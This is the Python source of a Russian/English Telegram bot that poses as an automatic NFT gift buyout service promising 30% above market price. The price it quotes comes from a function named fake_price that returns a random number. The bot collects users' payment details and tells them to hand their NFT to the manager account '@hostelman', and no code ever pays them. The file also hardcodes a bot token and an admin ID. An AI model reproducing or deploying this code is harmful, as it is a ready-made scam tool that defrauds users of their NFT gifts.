import logging
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
Application, CommandHandler, CallbackQueryHandler,
MessageHandler, filters, ContextTypes, ConversationHandler
)

TOKEN = “8729370914:AAFe5bDtSnGxuUbu-yUZ7dhNoRT-boOHkik”
ADMIN_ID = 174415647
MANAGER = “@hostelman”

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(**name**)

LANG, MAIN_MENU, SELL_NFT_LINK, SELL_CURRENCY, SELL_CONFIRM, SELL_REQUISITES = range(6)

TEXTS = {
“ru”: {
“welcome”: (
“*Приветствую! Это Автоматическая Скупка NFT подарков в Telegram* \n\n”
“Мы выкупаем NFT подарки *выше рыночной цены на 30%* быстро, безопасно и честно.\n\n”
“Выберите действие:”
),
“how_works”: (
“*Как проводится сделка?*\n\n”
“1. Вы отправляете ссылку на NFT подарок\n”
“2. Бот считает рыночную стоимость: модель, фон, узор\n”
“3. Выбираете способ оплаты\n”
“4. Бот предлагает цену +30% к рынку\n”
“5. Подтверждаете сделку\n”
“6. Отправляете NFT менеджеру @hostelman, получаете оплату”
),
“support”: “Поддержка: @hostelman”,
“send_link”: “Отправьте ссылку на ваш NFT подарок\nПример: https://t.me/nft/PlushPepe-2133”,
“invalid_link”: “Это не ссылка NFT. Отправьте ссылку вида: https://t.me/nft/Название-Номер”,
“choose_currency”: “Выберите способ получения оплаты:”,
“offer”: “NFT: {link}\nРыночная цена: ~{market} {sym}\n*Моя цена (+30%): {offer} {sym}*\n\nСогласны?”,
“send_requisites”: “Введите реквизиты для оплаты ({currency}):”,
“deal_created”: (
“Сделка оформлена!\n\nNFT: {link}\nСумма: {offer} {sym}\nРеквизиты: {req}\n\n”
“Отправьте NFT менеджеру @hostelman\n”
“После получения менеджер переведёт оплату в течение 5-15 минут.”
),
“deal_cancelled”: “Сделка отменена.”,
“btn_sell”: “Продать NFT”,
“btn_how”: “Как проводится сделка?”,
“btn_support”: “Поддержка”,
“btn_yes”: “Да, согласен”,
“btn_no”: “Нет, отказаться”,
“btn_back”: “Назад”,
},
“en”: {
“welcome”: (
“*Welcome! Automatic NFT Gift Buyout Bot* \n\n”
“We buy NFT gifts *30% above market price*.\n\n”
“Choose an action:”
),
“how_works”: (
“*How does the deal work?*\n\n”
“1. Send a link to your NFT gift\n”
“2. Bot calculates market price: model, background, pattern\n”
“3. Choose payment method\n”
“4. Bot offers price +30% to market\n”
“5. Confirm the deal\n”
“6. Send NFT to manager @hostelman, receive payment”
),
“support”: “Support: @hostelman”,
“send_link”: “Send the link to your NFT gift\nExample: https://t.me/nft/PlushPepe-2133”,
“invalid_link”: “This is not an NFT link. Send a link like: https://t.me/nft/Name-Number”,
“choose_currency”: “Choose your payment method:”,
“offer”: “NFT: {link}\nMarket price: ~{market} {sym}\n*My price (+30%): {offer} {sym}*\n\nDo you agree?”,
“send_requisites”: “Enter your payment details ({currency}):”,
“deal_created”: (
“Deal confirmed!\n\nNFT: {link}\nAmount: {offer} {sym}\nDetails: {req}\n\n”
“Send NFT to manager @hostelman\n”
“Payment will be sent within 5-15 minutes.”
),
“deal_cancelled”: “Deal cancelled.”,
“btn_sell”: “Sell NFT”,
“btn_how”: “How does it work?”,
“btn_support”: “Support”,
“btn_yes”: “Yes, agree”,
“btn_no”: “No, cancel”,
“btn_back”: “Back”,
}
}

CURRENCIES = {
“CryptoBot”: {“sym”: “USDT”, “rate”: 1.0},
“TRC20 (USDT)”: {“sym”: “USDT”, “rate”: 1.0},
“Tonkeeper (TON)”: {“sym”: “TON”, “rate”: 0.18},
“Карта Украина”: {“sym”: “UAH”, “rate”: 40.0},
“Карта Россия”: {“sym”: “RUB”, “rate”: 92.0},
“Карта США”: {“sym”: “USD”, “rate”: 1.0},
“Карта Беларусь”: {“sym”: “BYN”, “rate”: 3.3},
“Карта Казахстан”: {“sym”: “KZT”, “rate”: 460.0},
“Карта Узбекистан”: {“sym”: “UZS”, “rate”: 12600.0},
“Карта Турция”: {“sym”: “TRY”, “rate”: 32.0},
“Карта Азербайджан”: {“sym”: “AZN”, “rate”: 1.7},
}

def get_lang(context):
return context.user_data.get(“lang”, “ru”)

def t(context, key):
return TEXTS[get_lang(context)][key]

def main_kb(context):
lang = get_lang(context)
tx = TEXTS[lang]
return InlineKeyboardMarkup([
[InlineKeyboardButton(tx[“btn_sell”], callback_data=“sell”)],
[InlineKeyboardButton(tx[“btn_how”], callback_data=“how”)],
[InlineKeyboardButton(tx[“btn_support”], callback_data=“support”)],
])

def currency_kb():
return InlineKeyboardMarkup([
[InlineKeyboardButton(name, callback_data=“cur_” + name)]
for name in CURRENCIES
])

import random
def fake_price():
return round(random.uniform(15, 120), 2)

async def start(update, context):
kb = InlineKeyboardMarkup([
[InlineKeyboardButton(“Русский”, callback_data=“lang_ru”),
InlineKeyboardButton(“English”, callback_data=“lang_en”)]
])
await update.message.reply_text(“Выберите язык / Choose language:”, reply_markup=kb)
return LANG

async def lang_cb(update, context):
q = update.callback_query
await q.answer()
context.user_data[“lang”] = q.data.split(”_”)[1]
await q.edit_message_text(t(context, “welcome”), parse_mode=“Markdown”, reply_markup=main_kb(context))
return MAIN_MENU

async def menu_cb(update, context):
q = update.callback_query
await q.answer()
d = q.data
back_kb = InlineKeyboardMarkup([[InlineKeyboardButton(t(context, “btn_back”), callback_data=“back”)]])
if d == “sell”:
await q.edit_message_text(t(context, “send_link”), parse_mode=“Markdown”)
return SELL_NFT_LINK
elif d == “how”:
await q.edit_message_text(t(context, “how_works”), parse_mode=“Markdown”, reply_markup=back_kb)
elif d == “support”:
await q.edit_message_text(t(context, “support”), parse_mode=“Markdown”, reply_markup=back_kb)
elif d == “back”:
await q.edit_message_text(t(context, “welcome”), parse_mode=“Markdown”, reply_markup=main_kb(context))
return MAIN_MENU

async def recv_link(update, context):
text = update.message.text.strip()
if “t.me/nft/” not in text:
await update.message.reply_text(t(context, “invalid_link”), parse_mode=“Markdown”)
return SELL_NFT_LINK
context.user_data[“nft_link”] = text
context.user_data[“market”] = fake_price()
await update.message.reply_text(t(context, “choose_currency”), reply_markup=currency_kb())
return SELL_CURRENCY

async def cur_cb(update, context):
q = update.callback_query
await q.answer()
name = q.data[4:]
cur = CURRENCIES[name]
market = context.user_data[“market”] * cur[“rate”]
offer = round(market * 1.3, 2)
market = round(market, 2)
context.user_data.update({“currency”: name, “offer”: offer, “sym”: cur[“sym”]})
msg = t(context, “offer”).format(
link=context.user_data[“nft_link”], market=market, offer=offer, sym=cur[“sym”]
)
kb = InlineKeyboardMarkup([[
InlineKeyboardButton(t(context, “btn_yes”), callback_data=“yes”),
InlineKeyboardButton(t(context, “btn_no”), callback_data=“no”),
]])
await q.edit_message_text(msg, parse_mode=“Markdown”, reply_markup=kb)
return SELL_CONFIRM

async def confirm_cb(update, context):
q = update.callback_query
await q.answer()
if q.data == “no”:
await q.edit_message_text(t(context, “deal_cancelled”), reply_markup=main_kb(context))
return MAIN_MENU
await q.edit_message_text(
t(context, “send_requisites”).format(currency=context.user_data.get(“currency”, “”)),
parse_mode=“Markdown”
)
return SELL_REQUISITES

async def recv_req(update, context):
req = update.message.text.strip()
msg = t(context, “deal_created”).format(
link=context.user_data.get(“nft_link”, “”),
offer=context.user_data.get(“offer”, “”),
sym=context.user_data.get(“sym”, “”),
req=req
)
await update.message.reply_text(msg, parse_mode=“Markdown”, reply_markup=main_kb(context))
try:
admin_msg = (
“Новая сделка!\n”
“User: @” + str(update.effective_user.username or update.effective_user.id) + “\n”
“NFT: “ + context.user_data.get(“nft_link”, “”) + “\n”
“Сумма: “ + str(context.user_data.get(“offer”, “”)) + “ “ + context.user_data.get(“sym”, “”) + “\n”
“Валюта: “ + context.user_data.get(“currency”, “”) + “\n”
“Реквизиты: “ + req
)
await update.get_bot().send_message(ADMIN_ID, admin_msg)
except Exception as e:
logger.error(str(e))
return MAIN_MENU

async def admin_cmd(update, context):
if update.effective_user.id != ADMIN_ID:
await update.message.reply_text(“Нет доступа”)
return
kb = InlineKeyboardMarkup([
[InlineKeyboardButton(“Статистика”, callback_data=“adm_stats”)],
[InlineKeyboardButton(“Рассылка”, callback_data=“adm_broadcast”)],
[InlineKeyboardButton(“Пользователи”, callback_data=“adm_users”)],
])
await update.message.reply_photo(
photo=“https://i.imgur.com/4M34hi2.png”,
caption=”*Панель администратора*\n\nБот: NFT Auto Buyout\nМенеджер: @hostelman”,
parse_mode=“Markdown”,
reply_markup=kb
)

async def admin_cb(update, context):
q = update.callback_query
if update.effective_user.id != ADMIN_ID:
await q.answer(“Нет доступа”, show_alert=True)
return
await q.answer()
if q.data == “adm_stats”:
await q.message.reply_text(“Статистика: в разработке”)
elif q.data == “adm_broadcast”:
await q.message.reply_text(“Рассылка: в разработке”)
elif q.data == “adm_users”:
await q.message.reply_text(“Пользователи: в разработке”)

def main():
app = Application.builder().token(TOKEN).build()
conv = ConversationHandler(
entry_points=[CommandHandler(“start”, start)],
states={
LANG: [CallbackQueryHandler(lang_cb, pattern=”^lang_”)],
MAIN_MENU: [CallbackQueryHandler(menu_cb)],
SELL_NFT_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, recv_link)],
SELL_CURRENCY: [CallbackQueryHandler(cur_cb, pattern=”^cur_”)],
SELL_CONFIRM: [CallbackQueryHandler(confirm_cb, pattern=”^(yes|no)$”)],
SELL_REQUISITES: [MessageHandler(filters.TEXT & ~filters.COMMAND, recv_req)],
},
fallbacks=[CommandHandler(“start”, start)],
allow_reentry=True,
)
app.add_handler(conv)
app.add_handler(CommandHandler(“admin”, admin_cmd))
app.add_handler(CallbackQueryHandler(admin_cb, pattern=”^adm_”))
logger.info(“Bot started!”)
app.run_polling()

if **name** == “**main**”:
main()
